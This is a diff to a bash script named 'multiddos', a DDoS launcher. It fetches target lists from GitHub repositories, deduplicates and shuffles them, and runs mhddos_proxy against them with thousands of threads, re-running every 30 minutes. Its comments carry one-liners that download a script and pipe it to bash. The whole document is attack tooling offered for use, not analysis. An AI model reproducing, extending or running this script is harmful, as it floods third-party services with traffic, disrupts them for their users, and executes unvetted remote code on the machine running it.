@@ -1,6 +1,7 @@
 #!/bin/bash
+# curl -LO tiny.one/multiddos && bash multiddos
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... test v0.9.1\n"
+clear && echo -e "Loading... v0.9.9\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
@@ -34,26 +35,25 @@ fi
 if [[ $t_set_manual != "on" ]]; then export threads="-t 5000"; fi # default threads if not passed in cmd line
 if [[ $t_proxy_manual != "on" ]]; then export proxy_threads="2000"; fi # default proxy_threads if not passed in cmd line
 
-### prepare target files (main and secondary)
-prepare_targets_and_banner () {
-export targets_curl="/var/tmp/curl.uaripper"
-export targets_uniq="/var/tmp/uniq.uaripper"
-export targets_lite="/var/tmp/lite.uaripper"
-rm -f /var/tmp/*uaripper #remove previous copies
 
-# read targets from github, exclude comments and empty lines, put valid addresses on new line
-echo "$(curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner_targets)" | while read LINE; do
-    if [[ "$LINE" != "#"* ]] && [ "$LINE" != "" ] ; then
-        for i in $LINE; do
-            if [[ $i == "http"* ]] || [[ $i == "tcp://"* ]]; then
-                echo $i >> $targets_curl
-            fi
-        done
+### prepare target files and show banner
+prepare_targets_and_banner () {
+[ -d /var/tmp/uaripper ] && rm -rf /var/tmp/uaripper/* || mkdir /var/tmp/uaripper/
+
+# all our sources
+echo "$(curl -s https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/all.txt)" > /var/tmp/uaripper/source1.txt
+echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.request.path')" > /var/tmp/uaripper/source2.txt
+echo "$(curl -s -X GET "https://raw.githubusercontent.com/db1000n-coordinators/LoadTestConfig/main/config.v0.7.json" 2>/dev/null | jq -r '.jobs[].args.client.static_host.addr')" > /var/tmp/uaripper/source3.txt
+
+# skip wrong lines in sources (those happens) and combine all sources together in single file all_targets.txt
+cat /var/tmp/uaripper/source* | while read LINE; do
+    if [[ $LINE == "http"* ]] || [[ $LINE == "tcp://"* ]]; then
+        echo $LINE >> /var/tmp/uaripper/all_targets.txt
     fi
 done
 
-# find only uniq targets, randomize order and save them in $targets_uniq
-cat $targets_curl | sort | uniq | sort -R > $targets_uniq
+# delete duplicates, randomize order and save final targets in uniq_targets.txt
+cat /var/tmp/uaripper/all_targets.txt | sort | uniq | sort -R > /var/tmp/uaripper/uniq_targets.txt
 
 # Print greetings and number of targets; yes, utility name "toilet" is unfortunate
 clear
@@ -61,8 +61,8 @@ toilet -t --metal "Український"
 toilet -t --metal "   жнець"
 toilet -t --metal " MULTIDDOS"
 typing_on_screen 'Шукаю завдання...' ; sleep 0.5
-echo -e "\n\nTotal targets found:" "\x1b[32m $(cat $targets_curl | wc -l)\x1b[m" && sleep 0.1
-echo -e "Uniq targets:" "\x1b[32m $(cat $targets_uniq | wc -l)\x1b[m" && sleep 0.1
+echo -e "\n\nTotal targets found:" "\x1b[32m $(cat /var/tmp/uaripper/all_targets.txt | wc -l)\x1b[m" && sleep 0.1
+echo -e "Uniq targets:" "\x1b[32m $(cat /var/tmp/uaripper/uniq_targets.txt | wc -l)\x1b[m" && sleep 0.1
 echo -e "\nЗавантаження..."; sleep 3
 clear
 }
@@ -117,7 +117,7 @@ while [ "$1" != "" ]; do
         --lite ) export lite="on"; shift ;;
         --plite ) export lite="on"; export proxy_threads=1000; shift ;;
         -p | --proxy-threads ) export proxy_finder="on"; export proxy_threads="$2"; shift 2 ;;
-        *   ) export args_to_pass+=" $1"; shift ;;
+        *   ) export args_to_pass+=" $1"; shift ;; #pass all unrecognized arguments to mhddos_proxy
     esac
 done
 
@@ -134,15 +134,15 @@ while true; do
     python3 -m pip install -r requirements.txt
 
     if [[ $lite == "on" ]]; then
-        tail -n 2000 $targets_uniq > $targets_lite
-        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c $targets_lite $methods $args_to_pass -t 5000 &
+        tail -n 2000 /var/tmp/uaripper/uniq_targets.txt > /var/tmp/uaripper/lite_targets.txt
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/uaripper/lite_targets.txt $methods $args_to_pass -t 2000 &
     else
-        cd /var/tmp/; split -n l/2 --additional-suffix=.uaripper $targets_uniq; cd - #split targets in 2
-        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/xaa.uaripper $methods $threads $args_to_pass &
+        cd /var/tmp/uaripper/; split -n l/2 --additional-suffix=.uaripper /var/tmp/uaripper/uniq_targets.txt; cd - #split targets in 2
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/uaripper/xaa.uaripper $methods $threads $args_to_pass &
         sleep 5 # to decrease load on cpu during simultaneous start
-        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/xab.uaripper $methods $threads $args_to_pass &
+        AUTO_MH=1 python3 ~/multidd/mhddos_proxy/runner.py -c /var/tmp/uaripper/xab.uaripper $methods $threads $args_to_pass &
     fi
-sleep 30
+sleep 30m
 pkill -f start.py; pkill -f runner.py;
 prepare_targets_and_banner
 done
